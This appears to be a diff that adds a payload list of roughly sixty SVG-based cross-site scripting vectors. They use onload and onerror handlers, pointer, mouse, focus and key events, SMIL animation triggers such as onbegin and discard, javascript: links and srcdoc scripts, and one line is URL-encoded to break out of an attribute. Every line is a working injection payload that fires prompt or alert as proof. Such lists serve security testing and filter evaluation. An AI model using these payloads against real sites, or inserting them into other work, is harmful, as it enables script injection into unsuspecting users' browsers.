@@ -1,0 +1,62 @@
+<svg onload=prompt(1)></svg>
+<svg onload=alert(1)></svg>
+<svg onload=confirm(1)></svg>
+<svg onload=print()></svg>
+<svg><image href=x onerror=prompt(1)></svg>
+<svg><image href=x onerror=alert(1)></svg>
+<svg><image href=x onerror=confirm(1)></svg>
+<svg><image href=x onerror=print()></svg>
+<svg><image href="data:x" onerror=prompt(1)></svg>
+<svg><image href="1" onerror=prompt(1)></svg>
+<svg><use href=x onerror=prompt(1)></svg>
+<svg><use href="data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='prompt(1)'/&gt;&lt;/svg&gt;#x"></svg>
+<svg><foreignObject width=100 height=100><iframe srcdoc="<script>prompt(1)</script>"></iframe></foreignObject></svg>
+<svg><a href="javascript:prompt(1)">x</a></svg>
+<svg><script>prompt(1)</script></svg>
+<svg><desc onmouseover=prompt(1)>x</desc></svg>
+<svg><title onmouseover=prompt(1)>x</title></svg>
+<svg><rect width=12 height=12 onclick=prompt(1) /></svg>
+<svg><circle r=6 onclick=prompt(1) cx=6 cy=6 /></svg>
+<svg><path d="M0 0" onclick=prompt(1) /></svg>
+<svg><text onclick=prompt(1)>x</text></svg>
+<svg><rect width=12 height=12 onpointerenter=prompt(1) /></svg>
+<svg><rect width=12 height=12 onpointerover=prompt(1) /></svg>
+<svg><rect width=12 height=12 onpointerdown=prompt(1) /></svg>
+<svg><rect width=12 height=12 onpointerup=prompt(1) /></svg>
+<svg><rect width=12 height=12 onpointermove=prompt(1) /></svg>
+<svg><rect width=12 height=12 onmousedown=prompt(1) /></svg>
+<svg><rect width=12 height=12 onmouseup=prompt(1) /></svg>
+<svg><rect width=12 height=12 onmousemove=prompt(1) /></svg>
+<svg><rect width=12 height=12 onmouseout=prompt(1) /></svg>
+<svg><rect width=12 height=12 onmouseover=prompt(1) /></svg>
+<svg><rect width=12 height=12 onmouseenter=prompt(1) /></svg>
+<svg><rect width=12 height=12 onmouseleave=prompt(1) /></svg>
+<svg><rect width=12 height=12 onfocusin=prompt(1) tabindex=1 /></svg>
+<svg><rect width=12 height=12 onfocusout=prompt(1) tabindex=1 /></svg>
+<svg><text onfocusin=prompt(1) tabindex=1>t</text></svg>
+<svg onkeydown=prompt(1) tabindex=1></svg>
+<svg onkeyup=prompt(1) tabindex=1></svg>
+<!-- SMIL-based triggers: onbegin/onend/onrepeat -->
+<svg><animate attributeName="x" begin="0s" dur="0.001s" onbegin=prompt(1) /></svg>
+<svg><animate attributeName="x" begin="0s" dur="0.001s" onend=prompt(1) /></svg>
+<svg><animate attributeName="x" begin="0s" dur="0.001s" repeatCount="2" onrepeat=prompt(1) /></svg>
+<svg><animateTransform attributeName="transform" type="scale" from="1" to="2" begin="0s" dur="0.001s" onbegin=prompt(1) /></svg>
+<svg><animateMotion path="M 0 0 L 1 1" begin="0s" dur="0.001s" onbegin=prompt(1) /></svg>
+<svg><set attributeName="x" to="1" begin="0s" onbegin=prompt(1) /></svg>
+<!-- Minimal animatetransform variants (case often tolerated in HTML parser) -->
+<svg><animatetransform onbegin=alert(1)></svg>
+<svg><animatetransform onbegin=prompt(1)></svg>
+<!-- discard: fires onbegin when its begin time is reached -->
+<svg><discard begin="0s" onbegin=prompt(1) /></svg>
+<!-- Event-driven begin without relying on onload -->
+<svg onclick="a.beginElement()"><animate id="a" attributeName="x" begin="indefinite" onbegin=prompt(1) /></svg>
+<svg onclick="d.beginElement()"><set id="d" attributeName="x" to="1" begin="indefinite" onbegin=prompt(1) /></svg>
+<svg onclick="r.beginElement()"><animateTransform id="r" attributeName="transform" type="rotate" begin="indefinite" onbegin=prompt(1) /></svg>
+<svg onclick="dc.beginElement()"><discard id="dc" begin="indefinite" onbegin=prompt(1) /></svg>
+<!-- onbegin via event-based timing syntax (click a rect with id target) -->
+<svg>
+  <rect id=target width=12 height=12 x=0 y=0/> 
+  <set attributeName=x to=1 begin="target.click" onbegin=prompt(1) />
+</svg>
+
+<!-- URL-encoded example reference (decoded above): %22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E -->
